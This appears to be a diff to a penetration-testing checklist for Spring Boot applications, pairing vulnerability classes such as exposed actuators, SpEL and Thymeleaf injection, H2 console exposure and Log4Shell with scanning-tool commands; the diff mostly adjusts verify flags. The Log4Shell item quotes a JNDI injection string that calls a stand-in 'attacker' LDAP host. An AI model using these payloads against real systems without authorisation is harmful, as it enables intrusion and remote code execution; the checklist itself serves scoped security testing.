@@ -6,20 +6,20 @@ Attack surface specific to Spring Boot and Spring Security applications.
 
 - [ ] Actuator endpoints exposed without authentication — `/actuator/env`, `/actuator/beans`, `/actuator/heapdump`, `/actuator/configprops` leak secrets, class names, and memory dumps
   -> payloads: `ensphere payloads auth_bypass --technique forced_browsing`
-  -> verify: `ensphere verify auth --technique forced_browsing --url <target>/actuator/env --in-scope <pattern>`
+  -> verify: `ensphere verify auth --technique no_token --url <target>/actuator/env --token <valid-jwt> --in-scope <pattern>`
 
 ## SpEL Injection
 
 - [ ] Spring Expression Language injection — user input evaluated via `SpelExpressionParser` or `@Value("#{...}")` allows arbitrary code execution
   -> payloads: `ensphere payloads ssti --runtime jvm --technique expression_eval`
-  -> verify: `ensphere verify ssti --technique expression_eval --url <endpoint> --param <param> --in-scope <pattern>`
+  -> verify: `ensphere verify ssti --url <endpoint> --param <param> --in-scope <pattern>`
   -> scan: `ensphere scan ./src --category ssti`
 
 ## Thymeleaf SSTI
 
 - [ ] Thymeleaf server-side template injection — user input in template names or fragments (`__${user_input}__`) leads to RCE via Thymeleaf preprocessor
   -> payloads: `ensphere payloads ssti --runtime jvm --technique sandbox_escape`
-  -> verify: `ensphere verify ssti --technique expression_eval --url <endpoint> --param <param> --in-scope <pattern>`
+  -> verify: `ensphere verify ssti --url <endpoint> --param <param> --in-scope <pattern>`
 
 ## Jackson Deserialization
 
@@ -44,13 +44,13 @@ Attack surface specific to Spring Boot and Spring Security applications.
 
 - [ ] Missing security headers — no `X-Content-Type-Options`, `X-Frame-Options`, `Strict-Transport-Security`, or `Content-Security-Policy` in Spring Security config
   -> payloads: manual — inspect response headers
-  -> verify: `ensphere verify clickjacking --technique frame_header_check --url <endpoint> --in-scope <pattern>`
+  -> verify: `ensphere verify clickjacking --url <endpoint> --in-scope <pattern>`
 
 ## Auth Filter Chain Gaps
 
 - [ ] Security filter chain ordering — `permitAll()` on paths that should be authenticated, or `antMatchers` pattern mismatch allowing bypass via trailing slash or case variation
   -> payloads: `ensphere payloads auth_bypass --technique forced_browsing`
-  -> verify: `ensphere verify auth --technique no_token --url <endpoint> --in-scope <pattern>`
+  -> verify: `ensphere verify auth --technique no_token --url <endpoint> --token <valid-jwt> --in-scope <pattern>`
 
 ## Property Source Injection
 
@@ -62,13 +62,13 @@ Attack surface specific to Spring Boot and Spring Security applications.
 
 - [ ] H2 database console enabled in production — `spring.h2.console.enabled=true` exposes `/h2-console` with full SQL access and potential RCE via `CALL`
   -> payloads: `ensphere payloads sqli --technique union`
-  -> verify: `ensphere verify auth --technique forced_browsing --url <target>/h2-console --in-scope <pattern>`
+  -> verify: `ensphere verify auth --technique no_token --url <target>/h2-console --token <valid-jwt> --in-scope <pattern>`
 
 ## Log4Shell Patterns
 
 - [ ] Log4j JNDI injection — logging user-controlled input with vulnerable Log4j versions (< 2.17.0) allows RCE via `${jndi:ldap://attacker/...}`
   -> payloads: `ensphere payloads ssrf --technique dns`
-  -> verify: `ensphere verify ssrf --technique dns --url <endpoint> --param <param> --in-scope <pattern>`
+  -> verify: `ensphere verify ssrf --url <endpoint> --param <param> --in-scope <pattern>`
   -> scan: `ensphere scan ./src --category ssrf`
 
 ## Mass Assignment
